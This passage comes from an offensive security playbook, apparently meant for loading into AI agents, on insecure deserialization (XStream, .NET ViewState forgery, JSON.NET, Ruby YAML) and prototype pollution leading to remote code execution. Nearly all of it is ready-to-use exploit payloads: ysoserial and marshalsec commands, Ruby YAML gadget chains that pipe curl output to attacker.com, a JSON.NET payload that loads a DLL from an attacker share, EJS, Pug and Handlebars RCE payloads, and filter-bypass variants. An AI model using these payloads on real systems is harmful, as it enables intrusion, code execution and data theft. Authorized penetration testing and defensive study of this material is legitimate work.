- `SpringPartiallyComparableAdvisorHolder` → JNDI lookup
- `SpringAbstractBeanFactoryPointcutAdvisor` → JNDI lookup
- `Rome` → `EqualsBean` → `ToStringBean` → JNDI or `TemplatesImpl`
- `Resin` → `QName` → classloading

### 3.2 Kryo

Kryo is a fast Java serialization framework (often used in Spark, Storm, Akka).

```
# Traffic fingerprint:
- Binary format, no standard magic bytes
- Often in message queues (Kafka, RabbitMQ) rather than HTTP
- Configuration key: kryo.setRegistrationRequired(false) → vulnerable

# Exploit approach:
# If registration is NOT required, any class can be deserialized
# Use standard Java gadgets (CC chains work if on classpath)

# If registration IS required but includes dangerous classes:
# Look for: java.net.URL, javax.management.*, java.lang.ProcessBuilder
```

### 3.3 Apache Avro

```
# Traffic fingerprint:
- Content-Type: avro/binary, application/avro
- Uses schema registry in many deployments
- Binary format with schema-defined structure

# Avro deserialization is schema-bound (generally safer)
# BUT: Avro's Java reflection API can be abused if:
# - Schema specifies "java-class" property
# - Custom deserializers are registered
# - GenericDatumReader with ReflectDatumReader
```

### 3.4 XStream

```
# Traffic fingerprint:
- XML with <sorted-set>, <dynamic-proxy>, <tree-map> elements
- Often used in Jenkins, Bamboo, TeamCity

# Payload (pre-1.4.7):
<sorted-set>
  <string>foo</string>
  <dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="java.beans.EventHandler">
      <target class="java.lang.ProcessBuilder">
        <command><string>calc</string></command>
      </target>
      <action>start</action>
    </handler>
  </dynamic-proxy>
</sorted-set>

# Tool: marshalsec supports XStream payloads
java -cp marshalsec.jar marshalsec.XStream ImageIO "calc"
```

---

## 4. .NET VIEWSTATE DESERIALIZATION

### 4.1 ViewState Structure

```
__VIEWSTATE is a hidden form field in ASP.NET WebForms:
<input type="hidden" name="__VIEWSTATE" value="BASE64_ENCODED_DATA" />

Structure (after base64 decode):
- Serialized object graph (LosFormatter → ObjectStateFormatter → BinaryFormatter)
- Optional MAC (message authentication code) — HMAC-SHA1/SHA256
- Optional encryption — AES
```

### 4.2 machineKey Requirement

ViewState MAC/encryption uses keys from `web.config`:

```xml
<machineKey
  validationKey="HEXKEY_FOR_MAC"
  decryptionKey="HEXKEY_FOR_ENCRYPTION"
  validation="SHA1"
  decryption="AES" />
```

**How to obtain machineKey**:
1. LFI/path traversal → read `web.config`
2. Information disclosure (error pages, debug endpoints)
3. Known default keys in specific products (SharePoint, DotNetNuke)
4. `.config` backup files left on server
5. Azure App Service: sometimes in `WEBSITE_AUTH_ENCRYPTION_KEY` env var

### 4.3 ViewState Forgery

```bash
# With known machineKey — generate malicious ViewState:
ysoserial.exe -p ViewState \
  -g TextFormattingRunProperties \
  -c "powershell -enc BASE64_PAYLOAD" \
  --path="/target-page.aspx" \
  --apppath="/" \
  --decryptionalg="AES" \
  --decryptionkey="DECRYPTION_KEY_HEX" \
  --validationalg="SHA1" \
  --validationkey="VALIDATION_KEY_HEX" \
  --islegacy

# Without encryption (enableViewStateMac=false or older .NET):
ysoserial.exe -p ViewState \
  -g TypeConfuseDelegate \
  -c "cmd /c whoami > C:\out.txt" \
  --validationalg="SHA1" \
  --validationkey="VALIDATION_KEY_HEX"
```

### 4.4 ViewState Attacks Without machineKey

```
# .NET Framework < 4.5 with enableViewStateMac="false" in web.config:
# No MAC → directly craft malicious ViewState

# Blacklist3r tool: try known/default keys:
Blacklist3r.exe --viewstate "BASE64_VIEWSTATE" --path "/page.aspx" --apppath "/"
# Tests common validation/decryption key pairs

# ASP.NET __VIEWSTATEGENERATOR value:
# Helps identify the target page's ViewState key derivation
# Format: 8 hex chars in hidden field
```

### 4.5 JSON.NET TypeNameHandling Exploitation

```json
// Vulnerable configuration:
// JsonConvert.DeserializeObject<T>(json, new JsonSerializerSettings {
//     TypeNameHandling = TypeNameHandling.All  // or Auto, Objects, Arrays
// });

// Payload — ObjectDataProvider chain:
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib",
    "$values": ["cmd.exe", "/c calc"]
  },
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
  }
}

// Alternative: System.Configuration.Install.AssemblyInstaller
// Triggers assembly load from attacker-controlled path
{
  "$type": "System.Configuration.Install.AssemblyInstaller, System.Configuration.Install",
  "Path": "\\\\attacker.com\\share\\payload.dll"
}
```

---

## 5. RUBY YAML.load vs YAML.safe_load

### 5.1 Why YAML.load Is Dangerous

`YAML.load` in Ruby constructs arbitrary Ruby objects via `!ruby/object:` tags. It is equivalent to `Marshal.load` or Java's `ObjectInputStream.readObject()` in terms of attack surface.

### 5.2 Version-Specific Exploits

**Ruby ≤ 2.7.2** — `Gem::Requirement` chain (simplest):

```yaml
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  specs:
    - !ruby/object:Gem::Source
      current_fetch_uri: !ruby/object:URI::Generic
        path: "| curl http://attacker.com/pwned"
```

**Ruby 2.x–3.x** — `Gem::Installer` chain (complex but broader):

```yaml
--- !ruby/hash:Gem::Installer
i: x
--- !ruby/hash:Gem::SpecFetcher
i: y
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
      read: 0
      header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
      socket: &1 !ruby/object:Gem::RequestSet
        sets: !ruby/object:Net::WriteAdapter
          socket: !ruby/module 'Kernel'
          method_id: :system
        git_set: "curl http://attacker.com/$(whoami)"
      method_id: :resolve
```

### 5.3 Detection in the Wild

```ruby
# Vulnerable patterns in source code:
YAML.load(user_input)
YAML.load(File.read(user_controlled_path))
YAML.load(params[:config])

# Safe alternatives:
YAML.safe_load(input)
YAML.safe_load(input, permitted_classes: [Symbol, Date])
Psych.safe_load(input)
```

### 5.4 Psych YAML Parser Versions

| Ruby Version | Psych Version | YAML.load Behavior |
|---|---|---|
| ≤ 2.0 | Psych 2.x | Arbitrary object construction |
| 2.1–2.7 | Psych 3.x | Arbitrary (YAML.load deprecated warning in 2.6+) |
| 3.0 | Psych 3.3 | YAML.load warns, still works |
| 3.1+ | Psych 4.0 | YAML.load defaults to safe_load behavior; need `unsafe_load` |

---

## 6. DETECTION FINGERPRINTS — MAGIC BYTES TABLE

### 6.1 By Protocol / Format

| Magic Bytes (Hex) | Base64 Prefix | Format | Language |
|---|---|---|---|
| `AC ED 00 05` | `rO0AB` | Java Serialized Object | Java |
| `00 01 00 00 00 FF FF FF FF` | `AAEAAAD/////` | .NET BinaryFormatter | .NET |
| `FF 01` | `/w` | .NET ObjectStateFormatter (ViewState) | .NET |
| `80 02` or `80 03` or `80 04` or `80 05` | Varies | Python pickle (protocol 2/3/4/5) | Python |
| `89 50 4E 47` | `iVBOR` | PNG (may contain phar polyglot) | PHP |
| `4F 3A` | `Tz` (base64 of `O:`) | PHP serialized object (`O:N:"Class"`) | PHP |
| `61 3A` | `YT` (base64 of `a:`) | PHP serialized array (`a:N:{`) | PHP |
| `04 08` | Varies | Ruby Marshal | Ruby |
| `1F 8B` | `H4s` | Gzip (may wrap serialized data) | Any |
| `48 02` or `63` | Varies | Hessian (2.0 / 1.0) | Java |

### 6.2 By Content-Type Header

| Content-Type | Likely Format | Risk |
|---|---|---|
| `application/x-java-serialized-object` | Java ObjectOutputStream | Critical |
| `application/x-java-serialized-object-xml` | XMLEncoder/XMLDecoder | Critical |
| `x-application/hessian` | Hessian binary | Critical |
| `application/x-hessian` | Hessian binary | Critical |
| `application/x-amf` | AMF (Flash) — often wraps Java | High |
| `application/x-yaml` / `text/yaml` | YAML (check for `!!` tags) | High (if YAML.load) |
| `application/java-archive` | JAR file | Context-dependent |
| `application/x-protobuf` | Protobuf (generally safe) | Low |
| `application/json` with `$type` | JSON.NET with TypeNameHandling | Critical |
| `application/xml` with suspicious elements | XStream / XMLDecoder | Critical |

### 6.3 By Cookie / Parameter Name

| Name Pattern | Likely Format | Product |
|---|---|---|
| `rememberMe` | Java serialized + AES | Apache Shiro |
| `__VIEWSTATE` | .NET ObjectStateFormatter | ASP.NET WebForms |
| `__EVENTTARGET` | .NET (associated with ViewState) | ASP.NET WebForms |
| `JSESSIONID` + binary cookie | Java serialized | Various Java servers |
| `rack.session` | Ruby Marshal (base64) | Ruby on Rails / Rack |
| `_session_id` + binary | Python pickle or JSON | Django / Flask |
| `connect.sid` | Node.js session (usually JSON, but check) | Express |
| `ci_session` | PHP serialized | CodeIgniter |
| `PHPSESSID` + serialized data | PHP serialized | PHP applications |

### 6.4 Quick Identification Script

```bash
# Check if base64-decoded data matches known magic bytes:
echo "BASE64_DATA" | base64 -d | xxd | head -1

# Java: look for "ac ed 00 05"
# .NET BinaryFormatter: look for "00 01 00 00 00 ff ff ff ff"
# Python pickle: look for "80 0N" where N is protocol version
# PHP: decode and look for "O:" or "a:" prefix
```

---

## 7. TOOLING QUICK REFERENCE

| Tool | Language | Purpose |
|---|---|---|
| **ysoserial** | Java | Java gadget chain payload generation |
| **ysoserial.net** | .NET | .NET gadget chain payload generation |
| **marshalsec** | Java | Hessian, XStream, JNDI, multiple format payloads |
| **PHPGGC** | PHP | PHP gadget chain generation (Laravel, Symfony, etc.) |
| **pimpmykali/ysoserial-modified** | Java | Extended ysoserial with more chains |
| **GadgetInspector** | Java | Automated gadget chain discovery in classpaths |
| **Blacklist3r** | .NET | ViewState key testing and forging |
| **SerializationDumper** | Java | Decode and inspect Java serialized objects |
| **jdeserialize** | Java | Parse Java serialization stream for analysis |

```bash
# ysoserial — try all chains with DNS callback:
for chain in CommonsCollections1 CommonsCollections2 CommonsCollections3 \
  CommonsCollections4 CommonsCollections5 CommonsCollections6 \
  CommonsCollections7 CommonsBeanutils1 Spring1 Spring2 \
  Groovy1 Hibernate1 Jdk7u21 URLDNS; do
  java -jar ysoserial.jar $chain "http://${chain}.TOKEN.collab.net" 2>/dev/null | \
    base64 -w0 > "${chain}.b64"
  echo "Generated: ${chain}"
done
```


---
# Part 3: Prototype Pollution


# SKILL: Prototype Pollution — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert prototype pollution for client and server JS. Covers `__proto__` vs `constructor.prototype`, merge-sink detection, Express/qs-style black-box probes, and gadget chains (EJS, Timelion-class patterns, child_process/NODE_OPTIONS). Assumes you know object spread and prototype inheritance — focus is on **parser behavior** and **post-pollution sinks**.

Routing note: prioritize PP when you see deep merges, recursive assign, `JSON.parse` followed by `Object.assign`, or URL queries converted to nested objects.

## 0. QUICK START

### Client-side first probes

```text
#__proto__[polluted]=1
#__proto__[polluted]=polluted
#constructor[prototype][polluted]=1
```

When input can reflect into DOM or framework routing, pair with `alert(1)` / `console` checks to observe whether global object properties were polluted.

```text
#__proto__[xxx]=alert(1)
```

### Server-side first probes（JSON / form）

```json
{"__proto__":{"polluted":true}}
```

```json
{"constructor":{"prototype":{"polluted":true}}}
```

After sending, check whether unrelated follow-up responses show abnormal headers/status/JSON spacing, or whether app logic reads `Object.prototype.polluted` (see §3 detection table).

### Quick boolean

If target code uses `lodash.merge`, `deep-extend`, `hoek.applyToDefaults`, or some `qs`/`query-string` configurations, **raise priority**.


## 1. MECHANISM

**Prototype chain**: when accessing `obj.key`, if `obj` lacks own property `key`, lookup walks up `[[Prototype]]` until `Object.prototype`.

**`__proto__`**: many parsers treat literal key `__proto__` as a magic path that attaches child properties to the prototype. Merging `{ "__proto__": { "x": 1 } }` can be equivalent to `Object.prototype.x = 1` depending on implementation and patch level.

**`constructor.prototype`**: `constructor` typically points to the object's constructor function; `constructor.prototype` is that constructor's prototype object. For plain objects this usually links to `Object.prototype`. Example path:

```json
{"constructor":{"prototype":{"polluted":1}}}
```

This is not always equivalent to `__proto__` (filtering, JSON parsing, Bun/Node differences), so **test both paths**.

**Core issue**: this is not just "one extra parameter"; in non-isolated merge logic, attacker-controlled keys point to **prototype objects**, giving **global** or shared template context malicious properties that later code reads normally, triggering gadgets.

---

## 2. CLIENT-SIDE DETECTION

### URL fragment

```text
https://app.example/page#__proto__[admin]=1
```

```text
https://app.example/#__proto__[xxx]=alert(1)
```

If router or analytics code parses fragments into objects and then merges, pollution may occur.

### `constructor.prototype` path

```text
#constructor[prototype][role]=admin
```

### DOM / attribute injection ideas

If the framework merges attribute names as object keys:

```text
__proto__[src]=//evil/xss.js
```

Event-handler style keys (implementation-dependent):

```text
__proto__[onerror]=alert(1)
```

**Verification**: open a fresh page without fragment and check in console whether test keys remain on `Object.prototype`; account for extension and DevTools interference.

---

## 3. SERVER-SIDE DETECTION (Express / Node, black-box)

The payloads below assume body/query is deeply parsed into objects by **qs** or similar parsers (possibly with `body-parser`). Observe **global side effects**, not only current endpoint return values.

| Payload (JSON example) | Expected observable signal |
|----------------------|----------------|
| `{"__proto__":{"parameterLimit":1}}` | Multi-parameter parsing in follow-up requests is ignored or abnormal (`qs`-style `parameterLimit`) |
| `{"__proto__":{"ignoreQueryPrefix":true}}` | Double-question-mark prefixes like `??foo=bar` are accepted or behavior changes sharply |
| `{"__proto__":{"allowDots":true}}` | Nested keys like `?foo.bar=baz` are expanded via dot notation |
| `{"__proto__":{"json spaces":" "}}` | JSON-serialized responses gain extra spaces (`JSON.stringify` spacing setting polluted) |
| `{"__proto__":{"exposedHeaders":["foo"]}}` | CORS responses include `foo`-related headers (if framework reads config from prototype) |
| `{"__proto__":{"status":510}}` | Some response status changes to 510 or another abnormal code (app reads `status` from object) |

**Operational tip**: send pollution request first, then a **clean** request to observe persistence; connection pools and worker lifecycle affect whether impact is globally visible.

---

## 4. EXPLOITATION GADGETS

| Target / scenario | Payload or pattern | Notes |
|-------------|------------|------|
| **EJS** | `{"__proto__":{"client":1,"escapeFunction":"JSON.stringify; process.mainModule.require('child_process').exec('COMMAND')"}}` | If template engine options like `escapeFunction` are read from polluted prototype, this may lead to RCE; strongly version/config dependent |
| **Timelion expression chain (CVE-2019-7609)** | `.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("COMMAND")')` | Historical chain: prototype pollution + timeline expression execution; useful to understand **expression + PP** combinations |
| **Node `child_process`** | Pollute `shell`, `argv0`, `env`, `NODE_OPTIONS`, etc. (merged into `exec`/`fork` option objects) | Depends on whether later code calls `spawn`/`fork` and reads options from prototype chain |
| **Generic constructor path** | `{"constructor":{"prototype":{"foo":"bar"}}}` | Bypasses weak validation that filters only the `__proto__` key |

**Chain mindset**: pollution -> dependency reads `obj.settings.xxx` without `hasOwnProperty` -> RCE / SSRF / path traversal.

---

## 5. TOOLS

| Project | Purpose |
|------|------|
| **yeswehack/pp-finder** | Helps locate PP-prone merge points and patterns |
| **yuske/silent-spring** | Research and detection around prototype-pollution surfaces |
| **yuske/server-side-prototype-pollution** | Server-side PP testing suite/methodology |
| **BlackFan/client-side-prototype-pollution** | Browser-side PP cases and payloads |
| **portswigger/server-side-prototype-pollution** | Burp ecosystem extension / supporting material |
| **msrkp/PPScan** | Scanning/verification helper |

Prioritize use on **authorized** targets; automated tools can cause side effects on stateful applications.

---

## 6. DECISION TREE

```
                    Input merged into nested object?
                    (query, JSON, GraphQL vars, YAML→JSON)
                                |
               NO --------------+-------------- YES
               |                              |
        Other vuln class                Parser allows __proto__ /
                                        constructor.prototype keys?
                                                    |
                                    NO --------------+-------------- YES
                                    |                              |
                             Check unicode /                    Confirm global effect:
                             bypass of key names               clean follow-up request
                                    |                              |
                                    +--------------+----------------+
                                                   |
                                                   v
                                    Gadget present? (template, spawn, JSON.stringify opts, CORS)
                                                   |
                              NO ------------------+------------------ YES
                              |                                         |
                       Report PP as DoS /              Build minimal RCE or
                       logic impact                   high-impact PoC
                              |                                         |
                              +---------------------+-------------------+
                                                    |
                                                    v
                              Client-side: fragment / DOM / third-party script
                              Server-side: qs/body-parser/lodash/deep-merge version audit
```

---

## Related routing

- Input routing and multi-injection parallel entry -> [Injection Testing Router](../injection-checking/SKILL.md).
- Template execution chains (non-PP) -> [SSTI](../ssti-server-side-template-injection/SKILL.md).
- Insecure deserialization (non-JS prototype) -> [Deserialization](../deserialization-insecure/SKILL.md).


---
# Part 4: Prototype Pollution Advanced


# SKILL: Prototype Pollution Advanced — RCE & Gadget Exploitation

> **AI LOAD INSTRUCTION**: Advanced prototype pollution escalation. Covers server-side RCE via template engines (EJS, Pug, Handlebars), Node.js child_process gadgets, client-side script gadgets, filter bypass patterns, and systematic detection. Load [../prototype-pollution/SKILL.md](../prototype-pollution/SKILL.md) first for fundamentals (merge sinks, `__proto__` vs `constructor.prototype`, basic probes).

## 0. RELATED ROUTING

- [prototype-pollution](../prototype-pollution/SKILL.md) — **LOAD FIRST** for PP fundamentals, merge-sink detection, basic probes
- [ssti-server-side-template-injection](../ssti-server-side-template-injection/SKILL.md) — template engine RCE context (PP often triggers through template gadgets)
- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) — client-side PP gadgets ultimately achieve XSS

### Advanced Reference

Load [KNOWN_GADGETS.md](./KNOWN_GADGETS.md) for the comprehensive gadget table by framework/library with polluted properties, trigger conditions, impact, and affected versions.


## 1. SERVER-SIDE PP → RCE

### 1.1 Node.js child_process.spawn — Shell/ENV Injection

When `child_process.spawn` or `child_process.fork` is called without explicit `env`/`shell` options, it inherits from `Object.prototype`:

```javascript
// Vulnerable pattern (very common):
const { execSync } = require('child_process');
execSync('ls');  // inherits shell, env from prototype

// Pollution for RCE:
Object.prototype.shell = '/proc/self/exe';
Object.prototype.argv0 = 'console.log(require("child_process").execSync("id").toString())//';
Object.prototype.NODE_OPTIONS = '--require /proc/self/cmdline';
// Next child_process call executes attacker code
```

Alternative ENV pollution:

```json
{"__proto__": {"shell": "node", "NODE_OPTIONS": "--require /proc/self/cmdline"}}
```

### 1.2 EJS (Embedded JavaScript Templates)

EJS `render()` reads `opts` from object properties. Polluting `outputFunctionName` injects code into the compiled template function:

```json
// Pollution payload:
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}

// When EJS renders ANY template after pollution:
// Compiled function includes: var x;process.mainModule.require('child_process').execSync('id');s = "";
// → RCE
```

Detection: any EJS `res.render()` call after pollution triggers it.

### 1.3 Pug (formerly Jade)

Pug's compiler reads `block` from object properties:

```json
{"__proto__": {"block": {"type": "Text", "val": "x]);process.mainModule.require('child_process').execSync('id');//"}}}
```

Alternative via `self` option:

```json
{"__proto__": {"self": true, "line": "x]});process.mainModule.require('child_process').execSync('id');//"}}
```

### 1.4 Handlebars

Handlebars template compilation checks `type` and `program` on template AST nodes:

```json
{"__proto__": {"type": "Program", "body": [{"type": "MustacheStatement", "path": {"type": "PathExpression", "original": "constructor.constructor('return process.mainModule.require(`child_process`).execSync(`id`)')()","parts": ["constructor","constructor"]}, "params": [], "hash": null}]}}
```

Simpler via `allowProtoMethodsByDefault`:

```json
{"__proto__": {"allowProtoMethodsByDefault": true, "allowProtoPropertiesByDefault": true}}
// Then use {{#with this as |obj|}}{{obj.constructor.constructor "return process.mainModule.require('child_process').execSync('id')"}}{{/with}}
```

### 1.5 Nunjucks

```json
{"__proto__": {"type": "Code", "value": "global.process.mainModule.require('child_process').execSync('id')"}}
```

### 1.6 Express res.render (Generic)

When Express calls `res.render()`, options merge with `app.locals` and `res.locals`. Polluted prototype properties appear as template variables:

```json
{"__proto__": {"view options": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}}
```

---

## 2. CLIENT-SIDE PROTOTYPE POLLUTION

### 2.1 jQuery Gadgets

`$.extend(true, {}, userInput)` performs deep merge — classic PP sink.

After pollution, jQuery's HTML methods use polluted properties:

```javascript
// Pollution:
Object.prototype.innerHTML = '<img src=x onerror=alert(1)>';

// Trigger: any jQuery DOM manipulation that reads innerHTML from prototype
$('<div>').appendTo('body');  // may use polluted property
```

### 2.2 Lodash Gadgets

```javascript
// Vulnerable functions (deep merge):
_.merge({}, userInput)
_.defaultsDeep({}, userInput)
_.set(obj, path, value)  // if path is attacker-controlled

// template() gadget:
Object.prototype.sourceURL = '\u000ajavascript:alert(1)//';
_.template('hello')();  // sourceURL injected into Function constructor
```

### 2.3 Script Gadgets in Frameworks

"Script gadgets" are framework code paths that read from `Object.prototype` and perform dangerous operations:

| Framework | Gadget Pattern | Polluted Property | Impact |
|---|---|---|---|
| jQuery | `$.html()`, element creation | `innerHTML`, `src` | XSS |
| Angular.js | `$interpolate` | `__defineGetter__` | XSS |
| Vue.js | Template compilation | `template`, `render` | XSS |
| Ember.js | Component rendering | Various view properties | XSS |
| Backbone.js | `_.template` | `sourceURL` | XSS |

### 2.4 DOM Property Pollution

```javascript
Object.prototype.src = 'https://attacker.com/evil.js';
Object.prototype.href = 'javascript:alert(1)';
Object.prototype.action = 'https://attacker.com/phish';
// Any dynamically created element may inherit these
```

---

## 3. DETECTION TECHNIQUES

### 3.1 Black-Box Server-Side Detection

```
Step 1: Inject and check
  POST /api/endpoint
  {"__proto__":{"polluted":"yes"}}
  
  Then: GET /api/anything
  Check if response contains "polluted" or behavior changes

Step 2: Error-based detection
  {"__proto__":{"toString":1}}
  → If server crashes or returns 500, toString was overwritten
  
  {"__proto__":{"valueOf":1}}
  → Same crash-based detection

Step 3: Response differential
  {"__proto__":{"status":555}}
  → Check if HTTP status code changes to 555
  
  {"__proto__":{"content-type":"text/plain"}}
  → Check if Content-Type header changes
```

### 3.2 Black-Box Client-Side Detection

```javascript
// In browser console after interacting with the app:
Object.prototype.testPollution
// If returns a value → something polluted the prototype

// Automated: override defineProperty to detect writes
Object.defineProperty(Object.prototype, '__proto__', {
    set: function(v) { console.trace('PP detected!', v); }
});
```

### 3.3 Automated Tools

| Tool | Type | Purpose |
|---|---|---|
| **PPScan** | Burp Extension | Scans for server-side PP |
| **server-side-prototype-pollution** | Burp Extension (Gareth Heyes) | Advanced server-side PP detection with multiple techniques |
| **ppfuzz** | CLI | Fuzz for client-side PP via URL fragment/query |
| **ppmap** | CLI | Map client-side PP to known gadgets |

---

## 4. BYPASS `__proto__` FILTERS

### 4.1 constructor.prototype Path

```json
// Instead of:
{"__proto__": {"polluted": "yes"}}

// Use:
{"constructor": {"prototype": {"polluted": "yes"}}}
```

### 4.2 Bracket Notation Variants

```
?constructor[prototype][polluted]=yes
?__proto__[polluted]=yes
?__pro__proto__to__[polluted]=yes   (if filter strips __proto__ once)
```

### 4.3 JSON Key Variations

```json
{"__proto__": {"a": 1}}
{"constructor": {"prototype": {"a": 1}}}
{"__proto__\u0000": {"a": 1}}
```

### 4.4 Key Distinction: Shallow vs Deep

`Object.assign` does NOT pollute prototype (shallow copy, safe). Only recursive/deep merge functions are vulnerable. Always verify the merge depth.

---

## 5. EXPLOITATION FLOW

```
1. Find merge sink (../prototype-pollution/SKILL.md Section 0)
   └── JSON body parsed and deep-merged into server object

2. Confirm pollution:
   └── {"__proto__":{"testxyz":"1"}} → check if testxyz appears globally

3. Identify technology stack:
   ├── Express + EJS → outputFunctionName gadget (Section 1.2)
   ├── Express + Pug → block gadget (Section 1.3)
   ├── Express + Handlebars → type/program gadget (Section 1.4)
   ├── Any Node.js with child_process → shell/NODE_OPTIONS (Section 1.1)
   ├── Client-side jQuery → DOM gadgets (Section 2.1)
   ├── Client-side Lodash → template/sourceURL (Section 2.2)
   └── Unknown → try KNOWN_GADGETS.md systematically

4. Craft RCE/XSS payload matching gadget

5. Verify with safe payload first (sleep / DNS callback)

6. Escalate to full RCE
```

---

## 6. DECISION TREE

```
Confirmed prototype pollution?
│
├── Server-side or client-side?
│   │
│   ├── SERVER-SIDE
│   │   ├── Template engine in use?
│   │   │   ├── EJS → __proto__.outputFunctionName (Section 1.2)
│   │   │   ├── Pug → __proto__.block (Section 1.3)
│   │   │   ├── Handlebars → __proto__.type (Section 1.4)
│   │   │   ├── Nunjucks → __proto__.type (Section 1.5)
│   │   │   └── Unknown → try each gadget from KNOWN_GADGETS.md
│   │   │
│   │   ├── child_process used anywhere?
│   │   │   ├── YES → __proto__.shell + NODE_OPTIONS (Section 1.1)
│   │   │   └── MAYBE → inject and trigger error to reveal stack
│   │   │
│   │   └── No known gadget?
│   │       ├── Try status code pollution: __proto__.status = 555
│   │       ├── Try header pollution: __proto__.content-type
│   │       └── Check KNOWN_GADGETS.md for framework match
│   │
│   └── CLIENT-SIDE
│       ├── jQuery loaded?
│       │   ├── YES → $.extend deep merge + DOM gadgets (Section 2.1)
│       │   └── Check ppmap for automated gadget detection
│       │
│       ├── Lodash loaded?
│       │   ├── YES → _.template sourceURL gadget (Section 2.2)
│       │   └── _.merge as both sink AND gadget
│       │
│       └── Framework (Angular/Vue/Ember)?
│           └── Script gadget lookup (Section 2.3)
│
├── __proto__ keyword filtered?
│   ├── Try constructor.prototype (Section 4.1)
│   ├── Try bracket notation (Section 4.2)
│   └── Try JSON key variations (Section 4.3)
│
└── Not confirmed yet?
    └── Go back to ../prototype-pollution/SKILL.md for detection
```

---

## 7. QUICK REFERENCE — KEY PAYLOADS

```json
// EJS RCE
{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');s"}}

// Pug RCE
{"__proto__":{"block":{"type":"Text","val":"x]);process.mainModule.require('child_process').execSync('id');//"}}}

// child_process RCE (Node.js)
{"__proto__":{"shell":"node","NODE_OPTIONS":"--require /proc/self/cmdline"}}

// Lodash template XSS
{"__proto__":{"sourceURL":"\u000ajavascript:alert(1)//"}}

// Filter bypass (constructor path)
{"constructor":{"prototype":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');s"}}}

// Safe detection probe
{"__proto__":{"pptest123":"polluted"}}
```


---
# Part 5: Known Gadgets Reference


## 1. EXPRESS TEMPLATE ENGINES (Server-Side → RCE)

### EJS (Embedded JavaScript)

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `outputFunctionName` | `"x;process.mainModule.require('child_process').execSync('id');s"` | Any `res.render()` call | RCE | All versions with `opts` merge |
| `destructuredLocals` | Array injection to control variable declarations | `res.render()` | RCE | EJS 3.x |
| `escapeFunction` | Replace escape function with code | `res.render()` with HTML escaping | RCE | EJS 2.x–3.x |
| `client` | `true` → changes compilation mode | `res.render()` | Code path change | All |

```json
{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('COMMAND');s"}}
```

### Pug (formerly Jade)

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `block` | `{"type":"Text","val":"x]);process.mainModule.require('child_process').execSync('COMMAND');//"}` | `pug.compile()` / `pug.render()` | RCE | Pug 2.x–3.x |
| `self` | `true` + `line` injection | Template compilation | RCE | Pug 2.x |
| `debug` | `true` → outputs source code | Template compilation | Info disclosure | All |
| `compileDebug` | `true` → includes debug info | Template compilation | Info disclosure | All |

```json
{"__proto__":{"block":{"type":"Text","val":"x]);process.mainModule.require('child_process').execSync('COMMAND');//"}}}
```

### Jade (Legacy)

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `self` | `true` | `jade.render()` | Code path change → RCE chain | Jade 1.x |
| `debug` | `true` | Compilation | Source disclosure | All |

### Mustache / Handlebars

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `type` | `"Program"` with malicious body | `Handlebars.compile()` | RCE | Handlebars 4.x |
| `allowProtoMethodsByDefault` | `true` | Any template render | Enables prototype method access | Handlebars 4.6+ |
| `allowProtoPropertiesByDefault` | `true` | Any template render | Enables prototype property access | Handlebars 4.6+ |
| `helpers` | Custom helper functions | Template with `{{helper}}` | RCE | All |

```json
{"__proto__":{"allowProtoMethodsByDefault":true,"allowProtoPropertiesByDefault":true}}
```

### Nunjucks

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `type` | `"Code"` with value containing malicious code | `nunjucks.render()` | RCE | Nunjucks 3.x |
| `autoesc` | `false` → disable auto-escaping | Template render | XSS escalation | All |

### Twig.js

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `allowInlineIncludes` | `true` | Template include | File inclusion | Twig.js 1.x |
| `rethrow` | Custom function | Error handling | Code execution | Twig.js 1.x |


## 2. LODASH

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `sourceURL` | `"\u000ajavascript:alert(1)//"` | `_.template()` execution | XSS | Lodash < 4.17.21 |
| `template` | Template string | `_.template()` | Code injection | All |
| `imports._.templateSettings.interpolate` | Custom regex | `_.template()` | Code injection | All |

Vulnerable functions (merge sinks, NOT gadgets):
- `_.merge(target, source)` — deep merge, writes to prototype
- `_.defaultsDeep(target, source)` — same
- `_.set(obj, path, value)` — if path is `__proto__.x`
- `_.setWith(obj, path, value)` — same

```javascript
// Pollution via merge:
_.merge({}, JSON.parse('{"__proto__":{"sourceURL":"\\u000ajavascript:alert(1)//"}}'));
// Trigger:
_.template('hello')();
```

---

## 3. JQUERY

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `innerHTML` | `"<img src=x onerror=alert(1)>"` | DOM manipulation | XSS | jQuery 2.x–3.x |
| `src` | `"javascript:alert(1)"` | Element creation | XSS | All |
| `href` | `"javascript:alert(1)"` | Link creation | XSS | All |
| `text` | Malicious string | `.text()` on empty elements | Content injection | All |

Vulnerable functions (merge sinks):
- `$.extend(true, {}, userInput)` — deep merge with `true` first arg
- `$.fn.extend()` — if called with attacker input

---

## 4. ANGULAR.JS (1.x)

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `__defineGetter__` | Overriding toString/valueOf | `$interpolate` / `$compile` | XSS | Angular 1.x |
